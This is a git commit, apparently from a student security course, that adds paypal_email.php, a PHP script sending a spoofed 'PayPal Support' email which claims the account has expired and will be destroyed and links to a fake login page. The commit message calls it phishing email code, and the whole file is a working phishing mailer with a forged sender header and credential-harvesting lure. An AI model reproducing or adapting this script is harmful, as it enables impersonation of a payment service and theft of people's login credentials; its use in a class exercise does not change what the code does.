2da83469a713b341d96157cfd77367ca6f7426ca
xepherPrime <xepherPrime@gmail.com>
2015-12-03 08:54:16 -0500

    paypal_email.php
    final for the phishing email's php code.  Mailinator email name: targetperson332@mailinator.com

---
+++ paypal_email.php
@@ -0,0 +1,25 @@
+<?php
+
+$to = "targetperson332@mailinator.com";
+$from = "paypal-customerservice@paypal.com";
+$headers = "From: paypal-customerservice@paypal.com";
+$subject = "Your PayPal Account Has Expired";
+$txt = "Dear Customer, \n
+		Please be aware that your account expired.  It is indispensible to perform an audit of your data
+		is present, otherwise your account will be destroyed.  Just click the link below. \n
+		<a href=\"https://web.njit.edu/~al322/332/paypallogin.html\">Click here</a> \n\n";
+
+$txt .= "We requests verification whenever an email address is selected as an account.  Your account cannot be used
+		until you verify it.\n\n
+		Sincerely, \n
+		PayPal Support \n\n
+		Please do not reply to this message.";
+
+
+if(isset($_GET["email"]))
+{
+	echo "$to<br>";
+    echo "$txt";
+    mail($to,$subject,$txt,$headers);
+}
+?>
